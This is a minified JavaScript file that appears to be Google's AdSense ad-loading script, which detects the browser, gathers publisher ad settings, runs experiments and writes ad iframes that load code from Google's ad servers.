(function(){var l=this,aa=function(a,b,c){return a.call.apply(a.bind,arguments)},ba=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}},t=function(a,b,c){t=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?aa:ba;return t.apply(null,arguments)};var u=(new Date).getTime();var x=function(a){a=parseFloat(a);return isNaN(a)||1<a||0>a?0:a},ca=function(a,b){var c=parseInt(a,10);return isNaN(c)?b:c},da=/^([\w-]+\.)*([\w-]{2,})(\:[0-9]+)?$/,ea=function(a,b){if(!a)return b;var c=a.match(da);return c?c[0]:b};var fa=x("0.0"),ga=ca("101",-1),ha=ca("98",0),ia=x("0.1"),ja=x("0.001"),ka=x("0.001"),la=x("0.03"),ma=x("0.01"),na=x("0.01"),oa=x("");var z=function(){return"r20160331"},A=/^true$/.test("false")?!0:!1,pa=/^true$/.test("false")?!0:!1,qa=/^true$/.test("false")?!0:!1,ra=qa||!pa;var B=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},sa=/&/g,ta=/</g,ua=/>/g,wa=/"/g,xa=/'/g,ya=/\x00/g,C={"\x00":"\\0","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\x0B",'"':'\\"',"\\":"\\\\","<":"<"},D={"'":"\\'"},E=function(a,b){return a<b?-1:a>b?1:0};var za=Array.prototype.forEach?function(a,b,c){Array.prototype.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,f="string"==typeof a?a.split(""):a,e=0;e<d;e++)e in f&&b.call(c,f[e],e,a)};var F;a:{var Aa=l.navigator;if(Aa){var Ba=Aa.userAgent;if(Ba){F=Ba;break a}}F=""}var G=function(a){return-1!=F.indexOf(a)};var H=function(){return G("Opera")||G("OPR")};var I=function(a){I[" "](a);return a};I[" "]=function(){};var Ca=H(),J=G("Trident")||G("MSIE"),Da=G("Edge"),K=G("Gecko")&&!(-1!=F.toLowerCase().indexOf("webkit")&&!G("Edge"))&&!(G("Trident")||G("MSIE"))&&!G("Edge"),Ea=-1!=F.toLowerCase().indexOf("webkit")&&!G("Edge"),Fa=function(){var a=l.document;return a?a.documentMode:void 0},Ga;
a:{var Ha="",Ia=function(){var a=F;if(K)return/rv\:([^\);]+)(\)|;)/.exec(a);if(Da)return/Edge\/([\d\.]+)/.exec(a);if(J)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(Ea)return/WebKit\/(\S+)/.exec(a);if(Ca)return/(?:Version)[ \/]?(\S+)/.exec(a)}();Ia&&(Ha=Ia?Ia[1]:"");if(J){var Ja=Fa();if(null!=Ja&&Ja>parseFloat(Ha)){Ga=String(Ja);break a}}Ga=Ha}
var Ka=Ga,La={},Ma=function(a){if(!La[a]){for(var b=0,c=B(String(Ka)).split("."),d=B(String(a)).split("."),f=Math.max(c.length,d.length),e=0;0==b&&e<f;e++){var g=c[e]||"",h=d[e]||"",k=RegExp("(\\d*)(\\D*)","g"),n=RegExp("(\\d*)(\\D*)","g");do{var q=k.exec(g)||["","",""],p=n.exec(h)||["","",""];if(0==q[0].length&&0==p[0].length)break;b=E(0==q[1].length?0:parseInt(q[1],10),0==p[1].length?0:parseInt(p[1],10))||E(0==q[2].length,0==p[2].length)||E(q[2],p[2])}while(0==b)}La[a]=0<=b}},Na=l.document,Oa=Na&&
J?Fa()||("CSS1Compat"==Na.compatMode?parseInt(Ka,10):5):void 0;var Pa;if(!(Pa=!K&&!J)){var Qa;if(Qa=J)Qa=9<=Number(Oa);Pa=Qa}Pa||K&&Ma("1.9.1");J&&Ma("9");var Ra=function(a){try{var b;if(b=!!a&&null!=a.location.href)a:{try{I(a.foo);b=!0;break a}catch(c){}b=!1}return b}catch(c){return!1}},L=function(a,b){if(!(1E-4>Math.random())){var c=Math.random();if(c<b)return c=Sa(window),a[Math.floor(c*a.length)]}return null},Sa=function(a){try{var b=new Uint32Array(1);a.crypto.getRandomValues(b);return b[0]/65536/65536}catch(c){return Math.random()}},Ta=function(a,b){for(var c in a)Object.prototype.hasOwnProperty.call(a,c)&&b.call(void 0,a[c],c,a)},Ua=function(a){var b=
a.length;if(0==b)return 0;for(var c=305419896,d=0;d<b;d++)c^=(c<<5)+(c>>2)+a.charCodeAt(d)&4294967295;return 0<c?c:4294967296+c};var Va=function(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)};var Ya=function(a,b,c,d,f,e){try{if((d?a.X:Math.random())<(f||a.N)){var g=a.M+b+("&"+Wa(c,1)),g=g.substring(0,2E3);"undefined"===typeof e?Xa(g):Xa(g,e)}}catch(h){}},Wa=function(a,b){var c=[];Ta(a,function(a,f){var e=null,g=typeof a;if(("object"==g&&null!=a||"function"==g)&&2>b)e=Wa(a,b+1);else if(0===a||a)e=String(a);e&&c.push(f+"="+encodeURIComponent(e))});return c.join("&")},Xa=function(a,b){l.google_image_requests||(l.google_image_requests=[]);var c=l.document.createElement("img");if(b){var d=
function(a){b(a);a=d;c.removeEventListener?c.removeEventListener("load",a,!1):c.detachEvent&&c.detachEvent("onload",a);a=d;c.removeEventListener?c.removeEventListener("error",a,!1):c.detachEvent&&c.detachEvent("onerror",a)};Va(c,"load",d);Va(c,"error",d)}c.src=a;l.google_image_requests.push(c)};var Za=document,M=window,$a,ab=null,N=Za.getElementsByTagName("script");N&&N.length&&(ab=N[N.length-1]);$a=ab;var bb=Object.prototype.hasOwnProperty,cb=function(a,b){for(var c in a)bb.call(a,c)&&b.call(void 0,a[c],c,a)},O=function(a){return!(!a||!a.call)&&"function"===typeof a},db=function(a,b){for(var c=1,d=arguments.length;c<d;++c)a.push(arguments[c])},eb=function(a,b){if(a.indexOf){var c=a.indexOf(b);return 0<c||0===c}for(c=0;c<a.length;c++)if(a[c]===b)return!0;return!1},fb=function(a){"google_onload_fired"in a||(a.google_onload_fired=!1,Va(a,"load",function(){a.google_onload_fired=!0}))},gb=function(a){a=
a.google_unique_id;return"number"===typeof a?a:0},hb=!!window.google_async_iframe_id;var ib=function(a){return(a=a.google_ad_modifications)?a.loeids||[]:[]},jb=function(a,b,c){if(!a)return null;for(var d=0;d<a.length;++d)if((a[d].ad_slot||b)==b&&(a[d].ad_tag_origin||c)==c)return a[d];return null};var kb=function(a,b,c){this.U=a;this.P=b;this.w=c;this.v=null;this.O=this.o;this.ca=!1},lb=function(a,b,c){this.message=a;this.fileName=b||"";this.lineNumber=c||-1},nb=function(a,b,c,d){var f;try{f=c()}catch(h){var e=a.w;try{var g=mb(h),e=(d||a.O).call(a,b,g,void 0,void 0)}catch(k){a.o("pAR",k)}if(!e)throw h;}finally{}return f},ob=function(a,b){var c=P;return function(){for(var d=[],f=0;f<arguments.length;++f)d[f]=arguments[f];return nb(c,a,function(){return b.apply(void 0,d)})}};
kb.prototype.o=function(a,b,c,d,f){var e={};e.context=a;b instanceof lb||(b=mb(b));e.msg=b.message.substring(0,512);b.fileName&&(e.file=b.fileName);0<b.lineNumber&&(e.line=b.lineNumber.toString());a=l.document;e.url=a.URL.substring(0,512);e.ref=(a.referrer||"").substring(0,512);if(this.v)try{this.v(e)}catch(g){}if(d)try{d(e)}catch(g){}Ya(this.U,f||this.P,e,this.ca,c);return this.w};
var mb=function(a){var b=a.toString();a.name&&-1==b.indexOf(a.name)&&(b+=": "+a.name);a.message&&-1==b.indexOf(a.message)&&(b+=": "+a.message);if(a.stack){var c=a.stack,d=b;try{-1==c.indexOf(d)&&(c=d+"\n"+c);for(var f;c!=f;)f=c,c=c.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/,"$1");b=c.replace(/\n */g,"\n")}catch(e){b=d}}return new lb(b,a.fileName,a.lineNumber)};var pb,P;pb=new function(){this.M="http"+("http:"===M.location.protocol?"":"s")+"://pagead2.googlesyndication.com/pagead/gen_204?id=";this.N=.01;this.X=Math.random()};P=new kb(pb,"jserror",!0);var ub=function(a,b){nb(P,a,b,qb)},qb=P.o,vb=function(a,b){return ob(a,b)};var wb={client:"google_ad_client",format:"google_ad_format",slotname:"google_ad_slot",output:"google_ad_output",ad_type:"google_ad_type",async_oa:"google_async_for_oa_experiment",pse:"google_pstate_expt"};P.w=!A;var Q=function(a,b){this.start=a<b?a:b;this.end=a<b?b:a};Q.prototype.clone=function(){return new Q(this.start,this.end)};var xb=function(a,b){this.D=b>=a?new Q(a,b):null},zb=function(a,b,c,d,f){var e=new Q(d,d+f-1);(f=0>=f||f%c.length)||(a=a.D,f=!(a.start<=e.start&&a.end>=e.end));if(f)return null;b=yb(b);return null!==b&&e.start<=b&&e.end>=b?c[(b-d)%c.length]:null},yb=function(a){var b;try{b=parseInt(a.localStorage.getItem("google_experiment_mod"),10)}catch(c){return null}if(0<=b&&1E3>b)return b;b=Math.floor(1E3*Sa(a));try{return a.localStorage.setItem("google_experiment_mod",""+b),b}catch(c){return null}};var Ab=null,Bb=function(){if(!Ab){for(var a=window,b=a,c=0;a&&a!=a.parent;)if(a=a.parent,c++,Ra(a))b=a;else break;Ab=b}return Ab};var R={ia:{},za:{j:"453848100",i:"453848101"},sa:{j:"24819308",i:"24819309",fa:"24819320",la:"24819321"},ra:{j:"24819330",i:"24819331"},oa:{j:"86724438",i:"86724439"},va:{j:"10573505",i:"10573506"},K:{j:"10573595",i:"10573596"},L:{j:"10573581",i:"10573582"},ua:{j:"10573605",i:"10573606"},J:{j:"10573695",i:"10573696"},ja:{j:"26835105",i:"26835106"},na:{j:"35923720",i:"35923721"},A:{j:"35923760",i:"35923761"},I:{j:"20040000",i:"20040001"},ga:{j:"20040016",i:"20040017"},ta:{j:"19188000",i:"19188001"},
ha:{ea:"314159230",qa:"314159231"},pa:{wa:"27285692",ya:"27285712",xa:"27285713"},ka:{j:"29222061",i:"29222062",ma:"29222063"}};var Cb=new xb(100,199),Db=new xb(400,499);var S=function(a,b,c,d){return a.location&&a.location.hash=="#google_plle_"+d?d:L([c,d],b)};var Eb=function(a,b,c){ub("files::getSrc",function(){if("https:"==M.location.protocol&&"http"==c)throw c="https",Error("Requested url "+a+b);});return[c,"://",a,b].join("")},Fb=function(a,b,c){c||(c=ra?"https":"http");return Eb(a,b,c)};var Gb=function(){},Ib=function(a,b,c){switch(typeof b){case "string":Hb(b,c);break;case "number":c.push(isFinite(b)&&!isNaN(b)?String(b):"null");break;case "boolean":c.push(String(b));break;case "undefined":c.push("null");break;case "object":if(null==b){c.push("null");break}if(b instanceof Array||void 0!=b.length&&b.splice){var d=b.length;c.push("[");for(var f="",e=0;e<d;e++)c.push(f),Ib(a,b[e],c),f=",";c.push("]");break}c.push("{");d="";for(f in b)b.hasOwnProperty(f)&&(e=b[f],"function"!=typeof e&&
(c.push(d),Hb(f,c),c.push(":"),Ib(a,e,c),d=","));c.push("}");break;case "function":break;default:throw Error("Unknown type: "+typeof b);}},Jb={'"':'\\"',"\\":"\\\\","/":"\\/","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\u000b"},Kb=/\uffff/.test("\uffff")?/[\\\"\x00-\x1f\x7f-\uffff]/g:/[\\\"\x00-\x1f\x7f-\xff]/g,Hb=function(a,b){b.push('"');b.push(a.replace(Kb,function(a){if(a in Jb)return Jb[a];var b=a.charCodeAt(0),f="\\u";16>b?f+="000":256>b?f+="00":4096>b&&(f+="0");return Jb[a]=
f+b.toString(16)}));b.push('"')};var Lb=G("Safari")&&!((G("Chrome")||G("CriOS"))&&!H()&&!G("Edge")||G("Coast")||H()||G("Edge")||G("Silk")||G("Android"))&&!(G("iPhone")&&!G("iPod")&&!G("iPad")||G("iPad")||G("iPod"));var T=null,Mb=K||Ea&&!Lb||Ca||"function"==typeof l.btoa;var U="google_ad_block google_ad_channel google_ad_client google_ad_format google_ad_height google_ad_host google_ad_host_channel google_ad_host_tier_id google_ad_modifications google_ad_output google_ad_region google_ad_section google_ad_slot google_ad_type google_ad_unit_key google_ad_dom_fingerprint google_ad_width google_adtest google_allow_expandable_ads google_alternate_ad_url google_alternate_color google_ama google_analytics_domain_name google_analytics_uacct google_analytics_url_parameters google_auto_format google_available_width google_captcha_token google_city google_color_bg google_color_border google_color_line google_color_link google_color_text google_color_url google_container_id google_content_recommendation_ui_type google_contents google_core_dbp google_country google_cpm google_ctr_threshold google_cust_age google_cust_ch google_cust_criteria google_cust_gender google_cust_id google_cust_interests google_cust_job google_cust_l google_cust_lh google_cust_u_url google_disable_video_autoplay google_delay_requests_count google_delay_requests_delay google_ed google_eids google_enable_content_recommendations google_enable_ose google_encoding google_floating_ad_position google_font_face google_font_size google_frame_id google_gl google_hints google_is_split_slot google_image_size google_kw google_kw_type google_lact google_language google_loeid google_max_num_ads google_max_radlink_len google_mtl google_nofo google_num_radlinks google_num_radlinks_per_unit google_only_ads_with_video google_only_pyv_ads google_only_userchoice_ads google_override_format google_page_url google_pgb_reactive google_previous_watch google_previous_searches google_pubvars_recovery_regexp_experiment google_referrer_url google_region google_responsive_formats google_reuse_colors google_rl_dest_url google_rl_filtering google_rl_mode google_rt google_safe google_scs google_source_type google_sui google_skip google_tag_for_child_directed_treatment google_tag_info google_tag_origin google_tdsma google_tfs google_tl google_ui_features google_video_doc_id google_video_product_type google_video_url_to_fetch google_webgl_support google_with_pyv_ads google_yt_pt google_yt_up".split(" "),
Nb={google_ad_modifications:!0,google_analytics_domain_name:!0,google_analytics_uacct:!0},Ob=function(a){return(a=a.innerText||a.innerHTML)&&(a=a.replace(/^\s+/,"").split(/\r?\n/,1)[0].match(/^\x3c!--+(.*?)(?:--+>)?\s*$/))&&/google_ad_client/.test(a[1])?a[1]:null},Pb=function(a){if(a=a.innerText||a.innerHTML)if(a=a.replace(/^\s+/,"").split(/\r?\n/,1)[0],(a=a.match(/^\x3c!--+(.*?)(?:--+>)?\s*$/)||a.match(/^\/*\s*<!\[CDATA\[(.*?)(?:\/*\s*\]\]>)?\s*$/i))&&/google_ad_client/.test(a[1]))return a[1];return null},
Qb=function(a){if(a=a.innerText||a.innerHTML)if(a=a.replace(/^\s+|\s+$/g,"").replace(/\s*(\r?\n)+\s*/g,";"),(a=a.match(/^\x3c!--+(.*?)(?:--+>)?$/)||a.match(/^\/*\s*<!\[CDATA\[(.*?)(?:\/*\s*\]\]>)?$/i))&&/google_ad_client/.test(a[1]))return a[1];return null},Tb=function(a,b){var c;try{a:{var d=a.document.getElementsByTagName("script"),f=Ob,e;"undefined"!=typeof a.google_pubvars_recovery_regexp_experiment?e=a.google_pubvars_recovery_regexp_experiment:(e=L(["C","E","EM"],la),a.google_pubvars_recovery_regexp_experiment=
e);b.google_pubvars_recovery_regexp_experiment=e;switch(e){case "E":f=Pb;break;case "EM":var g=a.navigator&&a.navigator.userAgent||"",h;if(!(h=/appbankapppuzdradb|daumapps|fban|fbios|fbav|fb_iab|gsa\/|messengerforios|naver|niftyappmobile|nonavigation|pinterest|twitter|ucbrowser|yjnewsapp|youtube/i.test(g))){var k;if(k=/i(phone|pad|pod)/i.test(g)){var n;if(n=/applewebkit/i.test(g)&&!/version|safari/i.test(g)){var q;try{q=!(!M.navigator.W&&!(A&&M.google_top_window||M.top).navigator.W)}catch(w){q=!1}n=
!q}k=n}h=k}f=h?Ob:Qb}for(var p=d.length-1;0<=p;p--){var m=d[p];if(!m.google_parsed_script){m.google_parsed_script=!0;var v=f(m);if(v){c=v;break a}}}c=null}}catch(w){return!1}if(!c)return!1;try{for(var d=/(google_\w+) *= *(['"]?[\w.-]+['"]?) *(?:;|$)/gm,f={},r;r=d.exec(c);)f[r[1]]=Rb(r[2]);Sb(f,a)}catch(w){return!1}return!!a.google_ad_client},Ub=function(a){a.google_page_url&&(a.google_page_url=String(a.google_page_url));var b=[];cb(a,function(a,d){if(null!=a){var f;try{var e=[];Ib(new Gb,a,e);f=e.join("")}catch(g){}f&&
(f=f.replace(/\//g,"\\$&"),db(b,d,"=",f,";"))}});return b.join("")},Vb=function(a){for(var b=0,c=U.length;b<c;b++){var d=U[b];Nb[d]||(a[d]=null)}},Rb=function(a){switch(a){case "true":return!0;case "false":return!1;case "null":return null;case "undefined":break;default:try{var b=a.match(/^(?:'(.*)'|"(.*)")$/);if(b)return b[1]||b[2]||"";if(/^[-+]?\d*(\.\d+)?$/.test(a)){var c=parseFloat(a);return c===c?c:void 0}}catch(d){}}},Sb=function(a,b){for(var c=0;c<U.length;c++){var d=U[c];null==b[d]&&null!=
a[d]&&(b[d]=a[d])}};var V=function(a){this.m=a;a.google_iframe_oncopy||(a.google_iframe_oncopy={handlers:{},upd:t(this.ba,this)});this.Z=a.google_iframe_oncopy},Wb;var W="var i=this.id,s=window.google_iframe_oncopy,H=s&&s.handlers,h=H&&H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&&d&&(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}";
/[\x00&<>"']/.test(W)&&(-1!=W.indexOf("&")&&(W=W.replace(sa,"&amp;")),-1!=W.indexOf("<")&&(W=W.replace(ta,"&lt;")),-1!=W.indexOf(">")&&(W=W.replace(ua,"&gt;")),-1!=W.indexOf('"')&&(W=W.replace(wa,"&quot;")),-1!=W.indexOf("'")&&(W=W.replace(xa,"&#39;")),-1!=W.indexOf("\x00")&&(W=W.replace(ya,"&#0;")));Wb=W;V.prototype.set=function(a,b){this.Z.handlers[a]=b;this.m.addEventListener&&this.m.addEventListener("load",t(this.R,this,a),!1)};
V.prototype.R=function(a){a=this.m.document.getElementById(a);try{var b=a.contentWindow.document;if(a.onload&&b&&(!b.body||!b.body.firstChild))a.onload()}catch(c){}};V.prototype.ba=function(a,b){var c=Xb("rx",a),d;a:{if(a&&(d=a.match("dt=([^&]+)"))&&2==d.length){d=d[1];break a}d=""}d=(new Date).getTime()-d;c=c.replace(/&dtd=(\d+|-?M)/,"&dtd="+(1E5<=d?"M":0<=d?d:"-M"));this.set(b,c);return c};
var Xb=function(a,b){var c=new RegExp("\\b"+a+"=(\\d+)"),d=c.exec(b);d&&(b=b.replace(c,a+"="+(+d[1]+1||1)));return b};K||Ea||J&&Ma(11);var Yb=/MSIE [2-7]|PlayStation|Gecko\/20090226|Android 2\.|Opera/i,Zb=/Android/,$b=!1;var ac=function(a){if(!a)return"";(a=a.toLowerCase())&&"ca-"!=a.substring(0,3)&&(a="ca-"+a);return a};var X=null;var bc={"120x90":!0,"160x90":!0,"180x90":!0,"200x90":!0,"468x15":!0,"728x15":!0};var Y,Z=function(a){this.u=[];this.m=a||window;this.l=0;this.s=null;this.H=0},cc=function(a,b){this.S=a;this.da=b};Z.prototype.enqueue=function(a,b){0!=this.l||0!=this.u.length||b&&b!=window?this.C(a,b):(this.l=2,this.G(new cc(a,window)))};Z.prototype.C=function(a,b){this.u.push(new cc(a,b||this.m));dc(this)};Z.prototype.T=function(a){this.l=1;if(a){var b=vb("sjr::timeout",t(this.F,this,!0));this.s=this.m.setTimeout(b,a)}};
Z.prototype.F=function(a){a&&++this.H;1==this.l&&(null!=this.s&&(this.m.clearTimeout(this.s),this.s=null),this.l=0);dc(this)};Z.prototype.Y=function(){return!(!window||!Array)};Z.prototype.$=function(){return this.H};Z.prototype.nq=Z.prototype.enqueue;Z.prototype.nqa=Z.prototype.C;Z.prototype.al=Z.prototype.T;Z.prototype.rl=Z.prototype.F;Z.prototype.sz=Z.prototype.Y;Z.prototype.tc=Z.prototype.$;var dc=function(a){var b=vb("sjr::tryrun",t(a.aa,a));a.m.setTimeout(b,0)};
Z.prototype.aa=function(){if(0==this.l&&this.u.length){var a=this.u.shift();this.l=2;var b=vb("sjr::run",t(this.G,this,a));a.da.setTimeout(b,0);dc(this)}};Z.prototype.G=function(a){this.l=0;a.S()};
var ec=function(a){try{return a.sz()}catch(b){return!1}},fc=function(a){return!!a&&("object"===typeof a||"function"===typeof a)&&ec(a)&&O(a.nq)&&O(a.nqa)&&O(a.al)&&O(a.rl)},gc=function(){if(Y&&ec(Y))return Y;var a=Bb(),b=a.google_jobrunner;return fc(b)?Y=b:a.google_jobrunner=Y=new Z(a)},hc=function(a,b){gc().nq(a,b)},ic=function(a,b){gc().nqa(a,b)};var jc=hb?1==gb(M):!gb(M),kc=function(){var a=qa?"https":"http",b=I("script"),c;a:{if(A)try{var d=M.google_cafe_host||M.top.google_cafe_host;if(d){c=d;break a}}catch(f){}c=ea("","pagead2.googlesyndication.com")}return["<",b,' src="',Fb(c,["/pagead/js/",z(),"/r20151006/show_ads_impl.js"].join(""),a),'"></',b,">"].join("")},lc=function(a,b,c,
d){return function(){var f=!1;d&&gc().al(3E4);try{var e=a.document.getElementById(b).contentWindow;if(Ra(e)){var g=a.document.getElementById(b).contentWindow,h=g.document;h.body&&h.body.firstChild||(/Firefox/.test(navigator.userAgent)?h.open("text/html","replace"):h.open(),g.google_async_iframe_close=!0,h.write(c))}else{for(var k=a.document.getElementById(b).contentWindow,e=c,e=String(e),g=['"'],h=0;h<e.length;h++){var n=e.charAt(h),q=n.charCodeAt(0),p=h+1,m;if(!(m=C[n])){var v;if(31<q&&127>q)v=n;
else{var r=n;if(r in D)v=D[r];else if(r in C)v=D[r]=C[r];else{var w=r,y=r.charCodeAt(0);if(31<y&&127>y)w=r;else{if(256>y){if(w="\\x",16>y||256<y)w+="0"}else w="\\u",4096>y&&(w+="0");w+=y.toString(16).toUpperCase()}v=D[r]=w}}m=v}g[p]=m}g.push('"');k.location.replace("javascript:"+g.join(""))}f=!0}catch(va){k=Bb().google_jobrunner,fc(k)&&k.rl()}f&&(f=Xb("google_async_rrc",c),(new V(a)).set(b,lc(a,b,f,!1)))}},mc=function(a){var b=["<iframe"];cb(a,function(a,d){null!=a&&b.push(" "+d+'="'+a+'"')});b.push("></iframe>");
return b.join("")},nc=function(a){if(!X)a:{for(var b=[l.top],c=[],d=0,f;f=b[d++];){c.push(f);try{if(f.frames)for(var e=f.frames.length,g=0;g<e&&1024>b.length;++g)b.push(f.frames[g])}catch(k){}}for(b=0;b<c.length;b++)try{var h=c[b].frames.google_esf;if(h){X=h;break a}}catch(k){}X=null}if(!X){c={style:"display:none"};if(/[^a-z0-9-]/.test(a))return"";c["data-ad-client"]=ac(a);c.id="google_esf";c.name="google_esf";a=Fb(ea("","googleads.g.doubleclick.net"),["/pagead/html/",z(),
"/r20151006/zrt_lookup.html"].join(""));c.src=a;return mc(c)}return""},oc=function(a,b){var c=b.google_ad_output,d=b.google_ad_format;d||"html"!=c&&null!=c||(d=b.google_ad_width+"x"+b.google_ad_height);c=!b.google_ad_slot||b.google_override_format||!bc[b.google_ad_width+"x"+b.google_ad_height]&&"aa"==b.google_loader_used;d=d&&c?d.toLowerCase():"";b.google_ad_format=d;for(var d=[b.google_ad_slot,b.google_ad_format,b.google_ad_type,b.google_ad_width,
b.google_ad_height],c=[],f=0,e=$a.parentElement;e&&25>f;e=e.parentNode,++f)c.push(9!==e.nodeType&&e.id||"");(c=c.join())&&d.push(c);b.google_ad_unit_key=Ua(d.join(":")).toString();d=a.google_adk2_experiment=a.google_adk2_experiment||L(["C","E"],ka)||"N";if("E"==d){d=$a;c=[];for(f=0;d&&25>f;++f){var e="",e=(e=9!==d.nodeType&&d.id)?"/"+e:"",g;a:{if(d&&d.nodeName&&d.parentElement){g=d.nodeName.toString().toLowerCase();for(var h=d.parentElement.childNodes,k=0,n=0;n<h.length;++n){var q=h[n];if(q.nodeName&&
q.nodeName.toString().toLowerCase()===g){if(d===q){g="."+k;break a}++k}}}g=""}c.push((d.nodeName&&d.nodeName.toString().toLowerCase())+e+g);d=d.parentElement}d=c.join()+":";c=a;f=[];if(c)try{for(var p=c.parent,e=0;p&&p!==c&&25>e;++e){var m=p.frames;for(g=0;g<m.length;++g)if(c===m[g]){f.push(g);break}c=p;p=c.parent}}catch(v){}b.google_ad_dom_fingerprint=Ua(d+f.join()).toString()}else"C"==d&&(b.google_ad_dom_fingerprint="ctrl")};(function(a){P.v=function(b){za(a,function(a){a(b)})}})([function(a){a.shv=z()},function(a){Ta(wb,function(b,c){try{null!=l[b]&&(a[c]=l[b])}catch(d){}})}]);
ub("sa::main",function(){var a=window,b=a.google_ad_modifications=a.google_ad_modifications||{};if(!b.plle){b.plle=!0;var b=b.loeids=b.loeids||[],c=R.K,d=c.i;(c=a.location&&a.location.hash=="#google_plle_"+d?d:zb(Cb,a,[c.j,d],ga,ha))&&b.push(c);c=R.J;(c=S(a,ia,c.j,c.i))&&b.push(c);c=R.L;(c=S(a,ja,c.j,c.i))&&b.push(c);c=R.A;(c=S(a,na,c.j,c.i))&&b.push(c);Za.body||(c=R.I,(c=S(a,oa,c.j,c.i))&&b.push(c))}d=a.google_ad_slot;b=a.google_ad_modifications;!b||jb(b.ad_whitelist,d,void 0)?b=null:(c=b.space_collapsing||
"none",b=(d=jb(b.ad_blacklist,d))?{B:!0,V:d.space_collapsing||c}:b.remove_ads_by_default?{B:!0,V:c}:null);if(b&&b.B)Vb(a);else if(fb(a),(b=!1===window.google_enable_async)||(b=navigator.userAgent,Yb.test(b)?b=!1:(void 0!==window.google_async_for_oa_experiment||!Zb.test(navigator.userAgent)||Yb.test(navigator.userAgent)||(window.google_async_for_oa_experiment=zb(Db,window,["C","E"],Db.D.start,Math.round(1E3*fa))),b=Zb.test(b)?"E"!==window.google_async_for_oa_experiment:!0),b=!b||window.google_container_id||
window.google_ad_output&&"html"!=window.google_ad_output),b)a.google_loader_used="sb",a.google_start_time=u,oc(a,a),document.write(nc(a.google_ad_client)+kc());else{jc&&(c=a.google_ad_client,b=navigator,a&&c&&b&&(b=a.document,c=ac(c),/[^a-z0-9-]/.test(c)||((d=B("r20160212"))&&(d+="/"),d=Fb("pagead2.googlesyndication.com","/pub-config/"+d+c+".js"),c=b.createElement("script"),c.src=d,(b=b.getElementsByTagName("script")[0])&&b.parentNode&&b.parentNode.insertBefore(c,b))));a.google_unique_id?
++a.google_unique_id:a.google_unique_id=1;c={};null==a.google_ad_client&&Tb(a,c)&&(c.google_loader_features_used=2048);Sb(a,c);c.google_loader_used="sa";Vb(a);var b=I("script"),d={},f=c.google_ad_height;d.width='"'+c.google_ad_width+'"';d.height='"'+f+'"';d.frameborder='"0"';d.marginwidth='"0"';d.marginheight='"0"';d.vspace='"0"';d.hspace='"0"';d.allowtransparency='"true"';d.scrolling='"no"';d.allowfullscreen='"true"';d.onload='"'+Wb+'"';for(var e,f=a.document,g=d.id,h=0;!g||f.getElementById(g);)g=
"aswift_"+h++;d.id=g;d.name=g;var g=c.google_ad_width,h=c.google_ad_height,k=R.A,n=k.j,q=k.i,p=c.google_active_plles=c.google_active_plles||[];eb(ib(a),n)?p.push(n):eb(ib(a),q)&&p.push(q);$b=eb(ib(a),k.i);k=["<iframe"];for(e in d)d.hasOwnProperty(e)&&db(k,e+"="+d[e]);e="left:0;position:absolute;top:0;";$b&&(e=e+"width:"+g+"px;height:"+h+"px;");k.push('style="'+e+'"');k.push("></iframe>");e=d.id;g="border:none;height:"+h+"px;margin:0;padding:0;position:relative;visibility:visible;width:"+g+"px;background-color:transparent";
f.write(['<ins id="',e+"_expand",'" style="display:inline-table;',g,'"><ins id="',e+"_anchor",'" style="display:block;',g,'">',k.join(" "),"</ins></ins>"].join(""));e=d.id;oc(a,c);d=Ub(c);f=null;g=L(["C","E"],ma);if("E"==g){a:{try{if(window.JSON&&window.JSON.stringify&&window.encodeURIComponent){var m=encodeURIComponent(window.JSON.stringify(c)),v;if(Mb)v=l.btoa(m);else{h=[];for(n=k=0;n<m.length;n++){for(var r=m.charCodeAt(n);255<r;)h[k++]=r&255,r>>=8;h[k++]=r}if(!T)for(T={},m=0;65>m;m++)T[m]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(m);
m=T;r=[];for(k=0;k<h.length;k+=3){var w=h[k],y=k+1<h.length,va=y?h[k+1]:0,rb=k+2<h.length,sb=rb?h[k+2]:0,n=w>>2,q=(w&3)<<4|va>>4,p=(va&15)<<2|sb>>6,tb=sb&63;rb||(tb=64,y||(p=64));r.push(m[n],m[q],m[p],m[tb])}v=r.join("")}f=v;break a}Ya(pb,"sblob",{json:window.JSON?1:0,eURI:window.encodeURIComponent?1:0},!0,void 0,void 0)}catch(pc){P.o("sblob",pc,void 0,void 0)}f=""}f||(f="{X}")}else"C"==g&&(f="{C}");v=nc(c.google_ad_client);w=(new Date).getTime();if(y=a.google_async_for_oa_experiment)a.google_async_for_oa_experiment=
void 0;v=["<!doctype html><html><body>",v,"<",b,">",d,"google_show_ads_impl=true;google_unique_id=",gb(a),';google_async_iframe_id="',e,'";google_start_time=',u,";",g?'google_pub_vars = "'+f+'";':"",y?'google_async_for_oa_experiment="'+y+'";':"","google_bpp=",w>u?w-u:1,";google_async_rrc=0;google_iframe_start_time=new Date().getTime();</",b,">",kc(),"</body></html>"].join("");(a.document.getElementById(e)?hc:ic)(lc(a,e,v,!0))}});}).call(this);

